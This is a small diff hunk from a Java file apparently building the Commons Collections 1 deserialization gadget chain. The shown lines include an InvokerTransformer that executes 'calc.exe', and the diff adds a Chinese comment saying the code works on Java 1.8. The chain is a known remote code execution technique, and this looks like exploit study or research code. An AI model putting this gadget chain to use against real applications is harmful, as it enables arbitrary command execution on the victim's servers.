@@ -39,6 +39,8 @@ public class CommonCollections1 {
                 new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
                 new ConstantTransformer(1),
         };
+
+        // java 1.8版本可用。
         CC_LazyMap(transformers);
     }
 
